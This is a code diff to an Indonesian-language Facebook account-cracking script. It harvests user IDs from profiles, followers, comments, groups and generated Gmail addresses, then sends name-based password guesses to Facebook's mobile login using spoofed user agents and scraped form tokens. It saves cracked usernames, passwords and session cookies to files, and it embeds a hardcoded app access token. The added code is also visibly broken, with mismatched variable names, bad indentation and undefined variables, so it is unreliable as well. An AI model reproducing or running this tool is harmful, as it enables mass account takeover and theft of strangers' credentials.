@@ -1,5 +1,7 @@
 ###----------[ IMPORT MODULE LAIN ]---------- ###
-import os, sys, re, time, requests, calendar, random, bs4, uuid, json
+
+import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
+
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup as parser
 from datetime import date,datetime
@@ -26,6 +28,7 @@ P2 = "[#FFFFFF]" # PUTIH
 ###----------[ GLOBAL NAMA ]---------- ###
 sekarang = calendar.timegm(time.gmtime(time.time()))
 tampung = []
+ugent = []
 
 ###----------[ CEK WARNA TEMA ]---------- ###
 try:
@@ -36,6 +39,20 @@ except:
 	color_text = "[#00C8FF]"
 	color_panel = "#00C8FF"
 
+###----------[ GET DATA DARI DEVICE ]---------- ###
+android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
+try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
+except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
+versi_app = str(random.randint(111111111,999999999))
+
+###----------[ GENERATE USERAGENT ]---------- ###
+for z in range(200):
+	versi_android = str(random.randint(4,12))+".0.0"
+	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+	ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android} ; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBBD/L-03K;FBDV/L-03K;FBSV/{versi_android} ;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
+	if ua in ugent:pass
+	else:ugent.append(ua)
+	
 ###----------[ LOGO AUTHOR DAN VERSI]---------- ###
 class Logo:
 	
@@ -144,7 +161,12 @@ class Menu:
 		try:
 			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
 			nama = re.findall("<title>(.*?)</title>",url)[0]
-			return nama
+			if "Konten Tidak Ditemukan" in nama:
+				try:os.remove("data/cookie")
+				except:pass
+				Login().menu_login()
+			else:
+				return nama
 		except ConnectionError:
 			prints(Panel(f"""{M2}koneksi internet kamu bermasalah, silahkan cek koneksi kamu kembali""",width=80,style=f"{color_panel}"))
 			exit()
@@ -165,9 +187,10 @@ class Menu:
 		
 		###----------[ PANEL BIASA ]---------- ###
 		prints(Panel(f"{P2}{self.ip}",padding=(0,30),title=f"{H2}{nama}",subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik  [{color_text}04{P2}]. crack dari pencarian nama
-[{color_text}02{P2}]. crack dari pengikut   [{color_text}05{P2}]. crack dari member grup
-[{color_text}03{P2}]. crack dari komentar   [{color_text}06{P2}]. crack dari file sendiri""",width=80,padding=(0,7),style=f"{color_panel}"))
+		prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik  [{color_text}05{P2}]. crack dari pencarian nama
+[{color_text}02{P2}]. crack dari pengikut   [{color_text}06{P2}]. crack dari member grup
+[{color_text}03{P2}]. crack dari komentar   [{color_text}07{P2}]. crack dari file sendiri
+[{color_text}04{P2}]. crack dari random email""",width=80,padding=(0,7),style=f"{color_panel}"))
 		prints(Panel(f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
 		menu = console.input(f" {H2}• {P2}pilih menu : ")
 		
@@ -187,8 +210,16 @@ class Menu:
 			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
 			Crack().atursandi()
 			
-		###----------[ PENCARIAN NAMA ]---------- ###
+		###----------[ KOMENTAR ]---------- ###
 		elif menu in["4","04"]:
+			prints(Panel(f"""{P2}masukan nama untuk email, format email akan selalu @gmail.com""",width=80,style=f"{color_panel}"))
+			user = console.input(f" {H2}• {P2}masukan nama : ")
+			limit = console.input(f" {H2}• {P2}masukan limit : ")
+			Dump(cookie).Dump_Email(user,limit)
+			Crack().atursandi()
+			
+		###----------[ PENCARIAN NAMA ]---------- ###
+		elif menu in["5","05"]:
 			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan nama : ")
 			common = open("asset/nama_indonesia","r").read().splitlines()
@@ -203,14 +234,14 @@ class Menu:
 			Crack().atursandi()
 		
 		###----------[ MEMBER GRUP ]---------- ###
-		elif menu in["5","05"]:
+		elif menu in["6","06"]:
 			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan id grup : ")
 			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
 			Crack().atursandi()
 			
 		###----------[ FILE MASSAL ]---------- ###
-		elif menu in["6","06"]:
+		elif menu in["7","07"]:
 			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan tempat file : ")
 			Dump(cookie).Dump_File(user)
@@ -319,6 +350,15 @@ class Dump:
 			for z in file:
 				tampung.append(z)
 		except:pass
+		
+	###----------[ DUMP FILE ]---------- ###
+	def Dump_Email(self,nama,limit):
+		try:
+			for z in range(int(limit)):
+				email = nama+str(z)+"@gmail.com<=>"+nama
+				if email in tampung:pass
+				else:tampung.append(email)
+		except:pass
 
 ###----------[ BAGIAN CRACK ]---------- ###
 class Crack:
@@ -383,6 +423,7 @@ class Crack:
 								pass 
 							else:
 								pwx.append(depan+"123")
+								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
 						else:
 							if len(depan)<3:
@@ -390,6 +431,7 @@ class Crack:
 							else:
 								pwx.append(nama)
 								pwx.append(depan+"123")
+								pwx.append(depan+"1234")
 								pwx.append(depan+"12345")
 							belakang = nama.split(" ")[1]
 							if len(belakang)<3:
@@ -397,6 +439,7 @@ class Crack:
 							else:
 								pwx.append(depan+belakang)
 								pwx.append(belakang+"123")
+								pwx.append(belakang+"1234")
 								pwx.append(belakang+"12345")
 						fall.submit(self.metode_api,user,pwx)
 					except:
@@ -405,50 +448,86 @@ class Crack:
 		sys.exit()
 							
 	###----------[ METODE API ]---------- ###
-	def metode_api(self,user,pwx):
+	def metode_api(self,email,pwx):
 		prog.update(des,description=f" {H2}•{P2} crack {H2}aman{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
 		prog.advance(des)
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				#ua = random.choice(["Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; F1 Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/Oppo;FBBD/Oppo;FBDV/F1;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1280};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; INE-LX1r Build/HUAWEIINE-LX1r) [FBAN/Orca-Android;FBAV/212.1.0.13.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/151534286;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/INE-LX1r;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2128};FB_FW/1;]"])
-				params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": {random.randint(1,26)}, 
-					"email": user,
-					"locale": "en_US",
-					"password": pw,
-					"sdk": "android",
-					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
-				}
-				headers = {
-					"Host": "graph.facebook.com",
-					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
-					"x-fb-sim-hni": str(random.randint(20000, 40000)),
-					"x-fb-net-hni": str(random.randint(20000, 40000)),
-					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": Session().generate_ugent(),
-					"content-type": "application/x-www-form-urlencoded",
-					"x-fb-http-engine": "Liger"
-				}
-				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
+				ua = random.choice(ugent)
+				ses.headers.update({
+                "Host": "m.facebook.com",
+                "upgrade-insecure-requests": "1",
+                "user-agent": ua,
+                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                "dnt": "1",
+                "x-requested-with": "mark.via.gp",
+                "sec-fetch-site": "none",
+                "sec-fetch-mode": "navigate",
+                "sec-fetch-user": "?1",
+				"referer": "https://m.facebook.com/",
+				"accept-encoding": "gzip, deflate",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+			r = ses.get("https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F")
+			params = {
+                 'm_ts': re.search('name="m_ts" value="(.*?)"',str(r.text)).group(1), 
+                 'li': re.search('name="li" value="(.*?)"',str(r.text)).group(1), 
+                 'try_number': '0', 
+                 'unrecognized_tries': '0', 
+                 'email': email, 
+                 'prefill_contact_point': email, 
+                 'prefill_source': 'browser_dropdown', 
+                 'prefill_type': 'contact_point', 
+                 'first_prefill_source': 'header', 
+                 'first_prefill_type': 'contact_point', 
+                 'had_cp_prefilled': 'true', 
+                 'had_password_prefilled': 'false', 
+                 'is_smart_lock': 'false', 
+                 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(r.text)).group(1),
+                 'pass': pw,
+                 'jazoest': re.search('name="jazoest" value="(.*?)"',str(r.text)).group(1),
+                 'lsd': re.search('name="lsd" value="(.*?)"',str(r.text)).group(1),}
+			headers = {
+                "Host": "m.facebook.com",
+                "content-length": "1749",
+                "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(r.text)).group(1),
+                "user-agent": ua,
+                "content-type": "application/x-www-form-urlencoded",
+                "accept": "*/*",
+                "origin": "https://m.facebook.com",
+                "x-requested-with": "mark.via.gp",
+                "sec-fetch-site": "same-origin",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-dest": "empty",
+				"referer": "https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
+				"accept-encoding": "gzip, deflate",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			pos = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101',params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
-					self.ok.append(user)
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
-					tree = Tree("                                 ")
-					tree.add(f"\r{H2}{user}|{pw}{P2} ")
-					tree.add(f"{H2}{coki}{P2}")
-					prints(tree)
-					open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
-					break
+					user = re.findall("c_user=(\d+)",coki)[0]
+					if user in self.ok or user in self.cp:
+						break
+					else:
+						self.ok.append(user)
+						tree = Tree("                                 ")
+						tree.add(f"\r{H2}{user}|{pw}{P2} ")
+						tree.add(f"{H2}{coki}{P2}")
+						prints(tree)
+						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
+						break
 				elif "User must verify their account" in post.text:
-					self.cp.append(user)
-					tree = Tree("                                 ")
-					tree.add(f"\r{K2}{user}|{pw}{P2} ")
-					prints(tree)
-					open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
-					break
+					jason = post.json()["error_data"].encode("utf-8")
+					user = re.findall('"uid":(.*),"show_native_checkpoints"', jason)[0]
+					if user in self.ok or user in self.cp:
+						break
+					else:
+						self.cp.append(user)
+						tree = Tree("                                 ")
+						tree.add(f"\r{K2}{user}|{pw}{P2} ")
+						prints(tree)
+						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
+						break
 				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
 					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
 					prog.advance(des)
@@ -578,12 +657,12 @@ class Session:
 	
 	###----------[ GENERATE USER AGENT CRACK ]---------- ###
 	def generate_ugent(self):
-		versi_android = random.randint(4,12)
-		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-		versi_app = random.randint(410000000,499999999)
-		device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
-		density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
-		ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/3;FBMF/huawei;FBBD/huawei;FBDV/{device.split(' Build')[0]};FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+str(density)+";]"
+		#versi_android = random.randint(4,12)
+		#versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+		#versi_app = random.randint(410000000,499999999)
+		#device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
+		#density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
+		ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
 		return ugent		
 		
 if __name__=="__main__":
@@ -595,3 +674,4 @@ if __name__=="__main__":
 	except:pass
 	Menu().menu()
 #Gunakan Facebook dalam mode dasar dengan Telkomsel
+
